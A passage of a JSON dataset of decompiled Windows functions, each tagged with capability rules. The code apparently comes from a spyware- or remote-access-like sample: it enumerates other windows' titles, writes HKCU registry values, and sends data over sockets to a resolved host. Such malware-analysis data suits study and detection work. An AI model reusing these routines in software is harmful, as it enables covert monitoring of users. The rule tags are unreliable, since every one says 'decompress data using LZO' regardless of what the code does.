= 0x481ae2;\n        fcn.004059a4();\n        puStack396 = 0x481af0;\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x481b2e;\n    uStack388 = 0x481b08;\n    fcn.0040546c();\n    uStack388 = 0x481b19;\n    fcn.00405fd8();\n    uStack388 = 0x481b26;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 666
    },
    "0048277c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048277c(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar1;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack32 = 0x4828b5;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack44 = 0x48288e;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.004054c0();\n    fcn.00482674();\n    piVar1 = var_4h;\n    (**(*var_4h + 0x78))(var_4h, &fcn.0048277c::var_8h);\n    fcn.0040704c();\n    if (var_8h < 0xf) {\n        if (var_8h == 0xe) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 1) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 2) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 6) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 10) {\n            fcn.004054c0();\n        }\n    }\n    else if (var_8h == 0x12) {\n        fcn.004054c0();\n    }\n    else if (var_8h == 0x22) {\n        fcn.004054c0();\n    }\n    else if (var_8h == 0x32) {\n        fcn.004054c0();\n    }\n    else if (var_8h == 0x42) {\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = piVar1;\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x4828bc;\n    puStack40 = 0x4828b4;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 562
    },
    "00482a00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00482a00(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x482c68;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00482a00::var_24h;\n    var_28h = 0x482a2a;\n    fcn.0040546c();\n    var_28h = 0x482a32;\n    var_28h = fcn.00406f3c();\n    var_2ch = 0x482a40;\n    fcn.00482674();\n    var_2ch = var_20h;\n    (**(*var_20h + 0x68))();\n    fcn.0040704c();\n    fcn.00406f54();\n    iVar2 = fcn.004063bc(0, var_4h, 0x482c78);\n    if (-1 < iVar2 + -1) {\n        iVar4 = 0;\n        do {\n            fcn.004063bc(&fcn.00482a00::var_24h, var_4h, 0x482c80, iVar4);\n            fcn.00406f54();\n            fcn.004063bc(&fcn.00482a00::var_28h, var_8h, 0x482c8c);\n            fcn.004056f4();\n            fcn.004063bc(&fcn.00482a00::var_2ch, var_8h, 0x482c94);\n            fcn.004056f4();\n            iVar3 = fcn.004063bc(0, var_8h, 0x482c9c);\n            if (iVar3 < 0xf) {\n                if (iVar3 == 0xe) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 1) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 2) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 6) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 10) {\n                    fcn.00405504();\n                }\n            }\n            else if (iVar3 == 0x12) {\n                fcn.00405504();\n            }\n            else if (iVar3 == 0x22) {\n                fcn.00405504();\n            }\n            else if (iVar3 == 0x32) {\n                fcn.00405504();\n            }\n            else if (iVar3 == 0x42) {\n                fcn.00405504();\n            }\n            iVar1 = fcn.004063bc(0, var_8h, 0x482d50);\n            if (iVar1 == 0) {\n                fcn.00405504();\n            }\n            else {\n                fcn.00405504();\n            }\n            var_2ch = 0x482d84;\n            fcn.00405800();\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x482c6f;\n    var_28h = 0x482c32;\n    fcn.00405c60();\n    var_28h = 0x482c3a;\n    fcn.00406f3c();\n    var_28h = 0x482c42;\n    fcn.00406f3c();\n    var_28h = 0x482c4a;\n    fcn.00406f3c();\n    var_28h = 0x482c57;\n    fcn.00405490();\n    var_28h = 0x482c5f;\n    fcn.00406f3c();\n    var_28h = 0x482c67;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 1105
    },
    "00483b30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00483b30(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff60;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x483ca1;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405b8c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405b8c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 1) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 2) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 8) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 4) {\n            fcn.00405504();\n        }\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack76;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar6 = 0x483d24;\n            uVar5 = 0x483d24;\n            uVar4 = 0;\n            uVar2 = var_8h;\n            iVar3 = var_4h;\n            uVar7 = *0x4ab0c8;\n            fcn.00409d58(arg_8h);\n            fcn.00483afc(0x483d24, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n            fcn.00409c6c();\n            in_stack_ffffff60 = 0x483d40;\n            fcn.00405800(0x483d40, 0x483d30, 0x483d24, 0);\n            puVar1 = puStack76;\n        }\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405490(0x483ca8);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 746
    },
    "00483d6c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00483d6c(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff64;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x483ecd;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405b8c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405b8c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 1) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 2) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 8) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 4) {\n            fcn.00405504();\n        }\n        uVar6 = 0x483f50;\n        uVar5 = 0x483f50;\n        uVar4 = 0;\n        uVar2 = var_8h;\n        iVar3 = var_4h;\n        uVar7 = *0x4ab0c8;\n        fcn.00409d58(arg_8h);\n        fcn.00483afc(0x483f50, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n        fcn.00409c6c();\n        in_stack_ffffff64 = 0x483f6c;\n        fcn.00405800(0x483f6c, 0x483f5c, 0x483f50, 0);\n        puVar1 = puStack76;\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff64;\n    fcn.00405490(0x483ed4);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 702
    },
    "00483f98": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00483f98(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uVar4;\n    uint uVar5;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x48406b;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack76;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405b8c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405b8c();\n        var_30h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_30h);\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack68;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar5 = 0x484084;\n            uVar4 = 0;\n            iVar3 = var_4h;\n            uVar2 = *0x4ab0c8;\n            fcn.00409d58(arg_8h);\n            in_stack_ffffff80 = 0x484090;\n            fcn.00405800(0x484090, 0, arg_8h, uVar4, uVar5, iVar3, uVar2);\n            puVar1 = puStack68;\n        }\n    }\n    puStack68 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff80;\n    fcn.0040546c(0x484072);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 515
    },
    "00485db0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00485db0(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint pszPath;\n    uint pidl;\n    int32_t var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_114h = 0;\n    var_4h = 0;\n    uStack296 = 0x485e70;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack300;\n    sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    sub.shell32.dll_SHGetPathFromIDListA(pidl, &pszPath);\n    fcn.0040a9a4();\n    uVar1 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_114h;\n    fcn.0040546c(0x485e77);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 289
    },
    "0048601c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048601c(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint phkResult;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x486033;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack32 = 0x48603b;\n    fcn.004058ec();\n    uStack36 = 0x4860d6;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x4860aa;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    sub.advapi32.dll_RegOpenKeyA(0x80000001, 0x4860e4, &fcn.0048601c::phkResult);\n    iVar2 = var_8h;\n    if (var_8h != 0) {\n        iVar2 = *(var_8h + -4);\n    }\n    uVar1 = fcn.004058fc(iVar2 + 1);\n    uVar3 = 0;\n    uVar1 = fcn.004058fc(0, 1, uVar1);\n    sub.advapi32.dll_RegSetValueExA(phkResult, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = phkResult;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405490(0x4860dd);\n    return;\n}\n",
        "token_count": 440
    },
    "00486114": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00486114(void)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t in_stack_ffffffbc;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    puStack32 = 0x48612b;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    uStack36 = 0x486222;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x4861f6;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    fcn.00420b7c();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.004214dc();\n    uVar1 = var_8h == 0 || var_8h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.00405738();\n        var_4h = in_stack_ffffffbc;\n    }\n    else {\n        fcn.00405800(var_4h, 0x48628c, var_8h);\n    }\n    fcn.0042147c();\n    fcn.00404640();\n    *in_FS_OFFSET = var_4h;\n    *in_FS_OFFSET = &fcn.00486114::var_ch;\n    uStack48 = 0x486229;\n    iStack52 = 0x486221;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 457
    },
    "004874ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004874ac(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint buf;\n    uint s;\n    int32_t var_4h;\n    \n    puStack1048 = 0x4874c5;\n    s = in_EAX;\n    var_4h = param_2;\n    fcn.004058ec();\n    uStack1052 = 0x48753e;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    fcn.00403ae4();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        puVar1 = &fcn.004874ac::buf;\n        do {\n            *puVar1 = *(var_4h + iVar3);\n            iVar3 = iVar3 + 1;\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    sub.wsock32.dll_send(s, &fcn.004874ac::buf, 0x400, 0);\n    *in_FS_OFFSET = s;\n    fcn.0040546c(0x487545);\n    return;\n}\n",
        "token_count": 377
    },
    "00487a28": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00487a28 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x487b8a;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405664();\n    fcn.00405a48(&var_420h);\n    fcn.00405964();\n    uVar1 = fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    uVar2 = fcn.00409dd8();\n    fcn.0048794c();\n    iVar3 = sub.wsock32.dll_socket(2, 2, 0);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00403ae4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = var_4h;\n    if (var_4h != 0) {\n        iVar4 = *(var_4h + -4);\n    }\n    sub.wsock32.dll_sendto(iVar3, &var_4h, iVar4, 0, &var_1ch, 0x10);\n    fcn.00405664();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 624
    },
    "00487d38": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00487d95)\n// WARNING: Removing unreachable block (ram,0x00487dc0)\n// WARNING: Removing unreachable block (ram,0x00487d9d)\n// WARNING: Removing unreachable block (ram,0x00487dc8)\n\nvoid fcn.00487d38(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x487e43;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fVar1 = fcn.0040bbf4();\n    fcn.0040badc(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fVar1 = fcn.0040bbf4();\n    fcn.0040bb6c(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fcn.00409c6c();\n    fcn.00409c6c();\n    fcn.00409c6c();\n    fcn.00409c6c(0x487e64, 0, 0x487e64, 0, 0x487e64, 0);\n    uVar2 = 0x487e70;\n    fcn.00405800(0x487e70, 0);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x487e4a);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 406
    },
    "00488118": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488118(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405b8c(param_1);\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405b8c();\n    return;\n}\n",
        "token_count": 127
    },
    "0048838c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048838c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t *in_FS_OFFSET;\n    uchar uVar4;\n    bool bVar5;\n    float10 fVar6;\n    ulong uVar7;\n    uint32_t in_stack_ffffff0c;\n    uint32_t in_stack_ffffff18;\n    int32_t iVar8;\n    uint32_t uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t uStack36;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = 0xd;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_18h = 0x4883a9;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    fcn.004058ec();\n    var_1ch = 0x488721;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    _var_28h = CONCAT44(&stack0xfffffffc, 0x4886e5);\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048838c::var_2ch;\n    uVar4 = **0x4a4ccc == 1;\n    if (!uVar4) {\n        _var_30h = var_2ch << 0x20;\n        _var_38h = CONCAT44(0x4883d6, var_38h);\n        var_18h = &stack0xfffffffc;\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    var_30h = 0x4883de;\n    var_18h = &stack0xfffffffc;\n    fcn.00487fd8();\n    _var_30h = CONCAT44(var_2ch, 0x4883ec);\n    fcn.00405894();\n    if (uVar4) goto code_r0x004886bd;\n    var_30h = 0x4883fa;\n    fcn.00488118();\n    _var_30h = CONCAT44(var_2ch, var_48h);\n    var_34h = 0x488738;\n    var_38h = 0x48840a;\n    fcn.00487d38();\n    _var_38h = CONCAT44(var_34h, var_4ch);\n    _var_40h = CONCAT44(0x48841a, var_40h);\n    fcn.00405800();\n    _var_40h = CONCAT44(0x488422, var_40h);\n    cVar1 = fcn.0040a168();\n    uVar4 = cVar1 == '\\0';\n    if (uVar4) {\n        _var_40h = CONCAT44(0x488441, var_40h);\n        fcn.004034f0();\n        _var_40h = CONCAT44(0x488446, var_40h);\n        fcn.0040304c();\n    }\n    else {\n        _var_40h = CONCAT44(0x488430, var_40h);\n        fcn.004034fc();\n        _var_40h = CONCAT44(0x488435, var_40h);\n        fcn.0040304c();\n    }\n    _var_40h = CONCAT44(0x488456, var_40h);\n    fcn.00405bf0();\n    _var_40h = CONCAT44(0x48845b, var_40h);\n    fcn.0040409c();\n    _var_40h = CONCAT44(0x488460, var_40h);\n    fcn.0040304c();\n    _var_40h = CONCAT44(0x488465, var_40h);\n    fVar6 = fcn.0040bbc0();\n    _var_40h = fVar6;\n    var_44h = 0x48847f;\n    _var_28h = _var_40h;\n    fcn.0040c7f4();\n    var_44h = 0x488484;\n    fVar6 = fcn.0040bb94();\n    _var_30h = fVar6;\n    var_2ch = _var_30h >> 0x20;\n    var_44h = var_2ch;\n    var_48h = var_30h;\n    var_4ch = 0x48849e;\n    fcn.0040c7f4();\n    var_4ch = 0x488748;\n    var_50h = *0x4a4ae4;\n    var_54h = 0x488760;\n    var_58h = 0x48876c;\n    var_5ch = 0x488778;\n    var_60h = var_10h;\n    var_64h = 0x488788;\n    var_68h = var_14h;\n    uStack112 = 0x48876c;\n    uStack116 = *0x4a4aec;\n    uStack120 = 0x48876c;\n    uStack124 = *0x4a4af8;\n    uStack128 = 0x48876c;\n    uStack132 = 0x4884eb;\n    fcn.00405800();\n    uStack132 = 0x4884f8;\n    fcn.00405bf0();\n    uStack132 = 0x4884fd;\n    fcn.0040409c();\n    uStack132 = 0x488502;\n    fcn.0040304c();\n    uStack132 = 0x48850a;\n    fcn.00488158();\n    uStack132 = 0x488518;\n    fcn.00405894();\n    if (!uVar4) {\n        uStack132 = 0x48852e;\n        fcn.00405bf0();\n        uStack132 = 0x488533;\n        fcn.0040409c();\n        uStack132 = 0x488538;\n        fcn.0040304c();\n        var_54h = *0x4a4af4;\n        uStack132 = 0x488551;\n        fVar6 = fcn.0040bbc0();\n        _var_38h = fVar6;\n        var_34h = _var_38h >> 0x20;\n        uStack132 = var_34h;\n        uStack136 = var_38h;\n        uStack140 = 0x48856b;\n        fcn.0040c7f4();\n        uStack140 = 0x488570;\n        fVar6 = fcn.0040bb94();\n        _var_40h = fVar6;\n        var_3ch = _var_40h >> 0x20;\n        uStack140 = var_3ch;\n        uStack144 = var_40h;\n        uStack148 = 0x48858a;\n        fcn.0040c7f4();\n        uStack148 = 0x488798;\n        uStack152 = 0x488599;\n        fcn.00409c6c();\n        uStack152 = var_5ch;\n        uStack156 = 0x4887c0;\n        uStack160 = 0x48876c;\n        uStack164 = 0x488778;\n        puStack168 = var_18h;\n        uStack172 = 0x488788;\n        uStack176 = var_1ch;\n        uStack180 = 0x48876c;\n        uStack184 = *0x4a4af4;\n        uStack188 = 0x48876c;\n        uStack192 = *0x4a4af8;\n        uStack196 = 0x48876c;\n        puStack200 = 0x4885de;\n        fcn.00405800();\n        puStack200 = 0x4885eb;\n        fcn.00405bf0();\n        puStack200 = 0x4885f0;\n        fcn.0040409c();\n        puStack200 = 0x4885f5;\n        fcn.0040304c();\n        puStack200 = 0x488602;\n        fcn.004054c0();\n        bVar5 = true;\n        uStack204 = 0x48869a;\n        uStack208 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff30;\n        puStack200 = &stack0xfffffffc;\n        fcn.00405894();\n        if (bVar5) {\n            fcn.00488118();\n            fcn.00487d38(0x488738, var_64h);\n            fcn.00405800(var_68h);\n            uVar7 = fcn.00488054();\n            in_stack_ffffff18 = 0x488661;\n            iVar2 = fcn.00409dd8();\n            iVar8 = uVar7 >> 0x20;\n            iVar3 = (iVar2 << 10) >> 0x1f;\n            if (iVar3 == iVar8) {\n                if (iVar2 << 10 < uVar7) {\ncode_r0x00488678:\n                    in_stack_ffffff18 = 0;\n                    in_stack_ffffff0c = 0;\n                    sub.kernel32.dll_CreateThread(0, 0, fcn.0048817c, 0, 0, *0x4a5094);\n                }\n            }\n            else if (iVar3 < iVar8) goto code_r0x00488678;\n        }\n        *in_FS_OFFSET = in_stack_ffffff0c;\n    }\n    fcn.00403908();\n    fcn.0040304c();\n    fcn.0040546c();\ncode_r0x004886bd:\n    fcn.00405738();\n    *in_FS_OFFSET = in_stack_ffffff18;\n    fcn.004054c0(0x4886ec);\n    return;\n}\n",
        "token_count": 2616
    },
    "0048a348": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
